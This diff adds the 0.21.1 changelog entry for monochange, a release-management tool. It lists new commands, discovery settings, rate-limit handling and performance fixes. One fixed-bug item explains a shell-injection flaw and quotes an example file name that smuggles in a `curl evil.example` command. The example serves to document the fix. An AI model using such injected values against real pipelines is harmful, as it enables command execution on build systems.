@@ -4,6 +4,116 @@ All notable changes to this project will be documented in this file.
 
 This changelog is managed by [monochange](https://github.com/monochange/monochange).
 
+## [0.21.1](https://github.com/monochange/monochange/releases/tag/v0.21.1) (2026-11-06)
+
+### 🚀 Feature
+
+#### Add `monochange completions` and `monochange doctor`
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #840](https://github.com/monochange/monochange/pull/840)
+
+Two new commands close the two most common first-hour gaps:
+
+- `monochange completions <bash|zsh|fish|elvish|powershell>` prints a shell completion script. The script is generated from the commands the current repository's `monochange.toml` defines, so config-defined workflows complete alongside the built-ins. Install it with your shell's completion mechanism, for example `monochange completions zsh > "${fpath[1]}/_monochange"`.
+- `monochange doctor` checks the local environment in one place: git availability, `monochange.toml` parsing, and the toolchain behind every ecosystem enabled in the workspace (`cargo`, `node`, `deno`, `dart`, `python3`, `go`, `swift`, `pod`, `gradle`). Each check reports the tool's version or how to install it, with `--format json` for tooling. Checks are local only — nothing contacts the network.
+
+#### Honor ecosystems discovery settings and accept forgejo for init
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #857](https://github.com/monochange/monochange/pull/857)
+
+`[ecosystems.<id>]` discovery settings now shape `monochange discover` and the release paths built on it:
+
+- `enabled = false` skips that ecosystem entirely.
+- `roots = ["crates", "packages"]` restricts discovery to packages whose manifests live under the listed directories.
+- `exclude = ["tools/**"]` removes packages whose manifests match any glob. A glob that fails to compile warns once and matches nothing instead of silently dropping the filter.
+
+Previously these fields were parsed but discovery scanned every supported ecosystem regardless. `monochange init --provider` also accepts `forgejo` alongside `github`, `gitlab`, and `gitea`.
+
+#### Add canonical `monochange format` command
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #854](https://github.com/monochange/monochange/pull/854)
+
+Adds `monochange format` to rewrite `monochange.toml` in the idiomatic layout: top-level sections in a fixed order, `[package.*]` and `[group.*]` tables sorted by id, group members sorted alphabetically, and `[cli.*]` workflows last. Comments stay attached to their tables and the document header stays at the top.
+
+The command formats the result with taplo using the repository's tab-based, 100-column configuration, so it does not require a separate taplo installation. Use `monochange format --check` to fail CI when the file needs formatting without writing changes. The repository's `lint:monochange` task and CI lint job now run that check.
+
+### 📝 Changed
+
+#### Preview `check --fix`, print init next steps, and retire `monochange populate`
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #857](https://github.com/monochange/monochange/pull/857)
+
+Three usability fixes:
+
+- `monochange check --fix --dry-run` previews the fixes `--fix` would apply without writing any file. The summary says `would fix N files`, and the check still fails when errors remain on disk, so a dry run never silently passes a workspace that fixing would repair. `--dry-run` now requires `--fix`.
+- `monochange init` prints the next commands to run (validate, discover, create, preview) instead of only naming the file it wrote.
+- The legacy `monochange populate` command is removed. It has been a documented no-op since the default workflow set became empty; scripts calling it now get an unknown-command error and should call the steps they need directly.
+- TOML syntax errors in `monochange.toml` render with the same source snippet semantic errors get: file, line and column, the offending line with a caret, and the parser's reason, instead of a flat `failed to parse` message.
+
+### 🐛 Fixed
+
+#### Quote interpolated release paths in shell command steps
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #835](https://github.com/monochange/monochange/pull/835)
+
+`Command` steps that use `{{ changed_files }}` or `{{ changesets }}` now quote each path with POSIX single quotes before the command runs. A changeset or changed-file name is repository content a merged pull request controls, so a name like `feature'; curl evil.example; '.md` previously expanded into the command string verbatim; in a `shell = true` step that could execute as separate commands. Both the shell path (`sh -c`) and the default no-shell path (`shlex` splitting) decode the same quoting, so commands keep receiving the original paths — including paths containing spaces, which now survive no-shell steps as a single argument.
+
+Scalar values such as `{{ version }}` are unchanged, and `when` conditions plus step inputs still see raw paths. Configs that read raw path data through the structured `release.*` namespaces opt into unquoted values explicitly.
+
+#### Build hosted release trees without tripping GitHub's secondary rate limit
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #861](https://github.com/monochange/monochange/pull/861)
+
+Large hosted releases no longer fail. `monochange run release --commit --create-pr` with `MONOCHANGE_RELEASE_BACKEND=hosted` used to upload one `POST /git/blobs` request per release file. A release touching a hundred crate changelogs plus manifests and lockfiles exceeded GitHub's secondary rate limit for content creation, which is about 80 content-creating requests per minute. The resulting `403` was then reported as a missing `contents: write` permission. The fallback that sends file contents to the monochange app then ran past the 30 second provider timeout with `hosted CommitRelease request failed: error sending request for url (…/api/release-commits)`.
+
+`monochange_github::create_release_tree` now sends UTF-8 files inline in the `POST /git/trees` request, so GitHub creates their blobs server-side and the whole release usually needs one tree request. Only non-UTF-8 files are uploaded as separate base64 blobs. Deletions (`"sha": null`) and file modes (`100644`, `100755`, `120000`) are unchanged. A release with more than 4 MiB of inline text is split into tree requests chained through `base_tree`. The GitHub Actions verified-commit path for release pull requests now also inlines its files instead of creating one blob each.
+
+A `429`, or a `403` whose message names a rate limit, is now retried after 20, 40, and 60 seconds. If GitHub still rate limits the write, the warning names the rate limit before the release falls back to sending contents to the app:
+
+```text
+sending release file contents to the monochange app because the release tree could not be built: GitHub kept rate limiting git object writes in owner/repo after 3 retries (status 403: You have exceeded a secondary rate limit …)
+```
+
+Only a `403` without a rate-limit message still asks you to grant the job `contents: write`. The hosted `POST /api/release-commits` request now has a 5 minute timeout of its own. Other provider calls keep the 30 second `PROVIDER_HTTP_TIMEOUT`.
+
+#### Verify the complete prepared release record
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #850](https://github.com/monochange/monochange/pull/850)
+
+Reject modified release records before `CommitRelease`, even when their target IDs and versions still match the prepared release. Tag settings, package publication targets, provider metadata, changelogs, and release values must match the prepared manifest. A valid preparation timestamp and JSON key ordering remain unchanged. Rejected records leave overlapping release records untouched. If the expected record cannot be serialized, validation reports the cause before writing.
+
+Previously, `monochange step commit-release` could accept a record with matching targets but modified release instructions. It now reports a content mismatch. `PrepareRelease` preserves existing records. Recovery requires restoring the record from a trusted preparation, or explicitly configuring `update_release_json = true` on `CommitRelease` to restore the expected record.
+
+Prepared-release caches retain the originating command so separately invoked `prepare-release`, `commit-release`, and `open-release-request` steps validate the same record. Branch selection and command output continue to describe the current invocation. Older caches still load for inspection; before committing or opening a release request, rerun the original `PrepareRelease` workflow from trusted workspace inputs to establish that identity. Changing the producer command also requires restoring the expected record from trusted preparation or explicitly enabling `update_release_json` repair. Preparation preserves existing record bytes; record command changes remain a content mismatch.
+
+#### Resolve release records with one git walk instead of several per commit
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #837](https://github.com/monochange/monochange/pull/837)
+
+Release-record discovery — the lookup behind `step release-record`, `publish-readiness`, `tag-release`, and retarget planning — walked first-parent history by running four to six git commands per commit: a commit inspection for the parent, a redundant `rev-parse`, a shallow-file lookup, a parent-existence probe, and then the diff itself.
+
+The walk now resolves every commit and its first parent in one `git log --first-parent --format=%H %P` run. A commit whose first parent never appears in the walk sits at a cut boundary (the root, or a shallow clone), and only those fall back to a full tree listing — the same fallback the per-commit probes used to select, decided from the single walk instead of extra git calls. Each non-boundary commit now costs one `git diff-tree` instead of the previous four to six processes, so finding a record hundreds of commits back stops spawning thousands of git processes.
+
+Release-commit staging also asks git about every path at once: one `git ls-files` call reports which paths are tracked, and one `git check-ignore` call reports which are ignored, replacing up to two git processes per release path.
+
+<details>
+<summary><strong>⚡ Performance</strong></summary>
+
+#### Batch analysis snapshots and analyze packages in parallel
+
+_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #836](https://github.com/monochange/monochange/pull/836)
+
+`monochange analyze` and `monochange change classify` now spend far fewer git processes per run:
+
+- Snapshot labels are resolved once per target instead of once per package. A working-tree label stages the entire tree into a temporary index, so a 100-package workspace previously repeated that staging 100 times per side of the comparison.
+- Index snapshots and discovery materialization read every file through a single `git cat-file --batch` run instead of one `git show` process per file, matching what committed-revision snapshots already did.
+- Packages are analyzed in parallel across CPU cores. Each package's analysis may spawn an ecosystem subprocess (`node` for TypeScript, `cargo semver-checks` for Cargo), which is exactly the work worth spreading; result order stays deterministic.
+- Release trajectory analysis (`--release-ref`/`--main-ref`/`--head-ref`) shares one analysis session across its three comparison ranges, so discovery runs once per git tree instead of once per range.
+
+On workspaces with many packages, classification time drops roughly with core count plus the eliminated per-package git round trips; single-package workspaces are unchanged.
+
+</details>
+
 ## [0.21.0](https://github.com/monochange/monochange/releases/tag/v0.21.0) (2026-10-22)
 
 ### 🚀 Feature
